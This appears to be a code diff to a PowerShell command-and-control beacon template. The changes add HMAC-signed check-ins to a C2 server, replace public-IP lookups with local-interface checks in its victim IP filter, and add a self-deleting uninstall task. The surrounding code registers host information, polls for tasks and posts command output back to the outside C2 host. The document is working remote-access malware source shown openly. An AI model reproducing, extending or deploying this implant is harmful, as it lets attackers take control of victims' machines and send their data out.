@@ -1,5 +1,6 @@
 $C2_URL = "{{C2_URL}}"
 $BEACON_ID = "{{BEACON_ID}}"
+$BEACON_KEY = "{{BEACON_KEY}}"
 $SLEEP = {{SLEEP}}
 $JITTER = {{JITTER}}
 $ALLOWED_IPS = "{{ALLOWED_IPS}}"
@@ -55,48 +56,54 @@ function Test-Sandbox {
 
 function Test-IPFilter {
     if (-not $ALLOWED_IPS -and -not $BLOCKED_IPS) { return $true }
+    # Local interface addresses only; no third-party IP echo service.
     try {
-        $publicIP = (Invoke-WebRequest -Uri "http://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
+        $localIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress)
     } catch {
-        try { $publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 5).Content.Trim() }
-        catch { return $true }
+        try {
+            $localIPs = @([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | ForEach-Object { $_.IPAddressToString })
+        } catch { return $true }
     }
-    $ip = [System.Net.IPAddress]::Parse($publicIP)
-    if ($BLOCKED_IPS) {
-        foreach ($entry in $BLOCKED_IPS.Split("|")) {
-            $entry = $entry.Trim()
-            if (-not $entry) { continue }
-            if ($entry -match "/") {
-                $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
-                $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
-                $match = $true; $bits = $prefix
-                for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
-                    $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
-                    if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
-                    $bits -= 8
-                }
-                if ($match) { return $false }
-            } elseif ($publicIP -eq $entry) { return $false }
+    if (-not $localIPs -or $localIPs.Count -eq 0) { return $true }
+
+    foreach ($publicIP in $localIPs) {
+        try { $ip = [System.Net.IPAddress]::Parse($publicIP) } catch { continue }
+        if ($BLOCKED_IPS) {
+            foreach ($entry in $BLOCKED_IPS.Split("|")) {
+                $entry = $entry.Trim()
+                if (-not $entry) { continue }
+                if ($entry -match "/") {
+                    $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
+                    $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
+                    $match = $true; $bits = $prefix
+                    for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
+                        $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
+                        if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
+                        $bits -= 8
+                    }
+                    if ($match) { return $false }
+                } elseif ($publicIP -eq $entry) { return $false }
+            }
+        }
+        if ($ALLOWED_IPS) {
+            foreach ($entry in $ALLOWED_IPS.Split("|")) {
+                $entry = $entry.Trim()
+                if (-not $entry) { continue }
+                if ($entry -match "/") {
+                    $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
+                    $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
+                    $match = $true; $bits = $prefix
+                    for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
+                        $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
+                        if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
+                        $bits -= 8
+                    }
+                    if ($match) { return $true }
+                } elseif ($publicIP -eq $entry) { return $true }
+            }
         }
     }
-    if ($ALLOWED_IPS) {
-        foreach ($entry in $ALLOWED_IPS.Split("|")) {
-            $entry = $entry.Trim()
-            if (-not $entry) { continue }
-            if ($entry -match "/") {
-                $parts = $entry.Split("/"); $net = [System.Net.IPAddress]::Parse($parts[0]); $prefix = [int]$parts[1]
-                $ipBytes = $ip.GetAddressBytes(); $netBytes = $net.GetAddressBytes()
-                $match = $true; $bits = $prefix
-                for ($i = 0; $i -lt $ipBytes.Length -and $bits -gt 0; $i++) {
-                    $mask = if ($bits -ge 8) { 0xFF } else { (0xFF -shl (8 - $bits)) -band 0xFF }
-                    if (($ipBytes[$i] -band $mask) -ne ($netBytes[$i] -band $mask)) { $match = $false; break }
-                    $bits -= 8
-                }
-                if ($match) { return $true }
-            } elseif ($publicIP -eq $entry) { return $true }
-        }
-        return $false
-    }
+    if ($ALLOWED_IPS) { return $false }
     return $true
 }
 
@@ -121,23 +128,38 @@ function Get-HostInfo {
     return $info
 }
 
+# HMAC-SHA256 request authentication (matches the C2 beacon protocol)
+function Get-AuthHeaders {
+    param([string]$Body)
+    $ts = [DateTimeOffset]::Now.ToUnixTimeSeconds()
+    $nonce = [guid]::NewGuid().ToString("N").Substring(0, 16)
+    $hmac = New-Object System.Security.Cryptography.HMACSHA256(,[System.Text.Encoding]::UTF8.GetBytes($BEACON_KEY))
+    $sigBytes = [System.Text.Encoding]::UTF8.GetBytes("$ts.$nonce." + $Body)
+    $sig = [System.BitConverter]::ToString($hmac.ComputeHash($sigBytes)).Replace("-", "").ToLower()
+    return @{
+        "X-Beacon-ID"        = $BEACON_ID
+        "X-Beacon-OS"        = $OS_INFO
+        "X-Beacon-Timestamp" = "$ts"
+        "X-Beacon-Nonce"     = $nonce
+        "X-Beacon-Sign"      = $sig
+    }
+}
+
 # Register with C2
 function Register-Beacon {
     try {
         $Body = Get-HostInfo | ConvertTo-Json -Depth 3
-        $Resp = Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
+        $Headers = Get-AuthHeaders -Body $Body
+        $Resp = Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -Headers $Headers -ErrorAction Stop
         if ($Resp -eq "__TERMINATE__") { exit }
     } catch {}
 }
 
 function Get-CheckIn {
     try {
-        $Uri = "$C2_URL/checkin?id=$BEACON_ID"
-        $Headers = @{
-            "X-Beacon-ID" = $BEACON_ID
-            "X-Beacon-OS" = $OS_INFO
-        }
-        $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers -ErrorAction Stop
+        $Body = '{"type":"poll"}'
+        $Headers = Get-AuthHeaders -Body $Body
+        $Response = Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -Headers $Headers -ErrorAction Stop
         return $Response
     } catch {
         return $null
@@ -152,7 +174,8 @@ function Send-Result {
             output = $Output
             beacon_id = $BEACON_ID
         } | ConvertTo-Json
-        Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json"
+        $Headers = Get-AuthHeaders -Body $Body
+        Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -Headers $Headers
     } catch {}
 }
 
@@ -232,6 +255,12 @@ while ($true) {
             }
         } elseif ($Data -is [array]) {
             foreach ($Task in $Data) {
+                if ($Task.command -eq "__UNINSTALL__") {
+                    Send-Result -TaskID $Task.id -Output "UNINSTALLED"
+                    # Script stagers carry no persistence; remove the script itself (best effort) and exit.
+                    try { Remove-Item -Force $PSCommandPath -ErrorAction SilentlyContinue } catch {}
+                    exit
+                }
                 if ($Task.command -eq "__EXIT__") {
                     Send-Result -TaskID $Task.id -Output "BEACON_TERMINATED"
                     exit
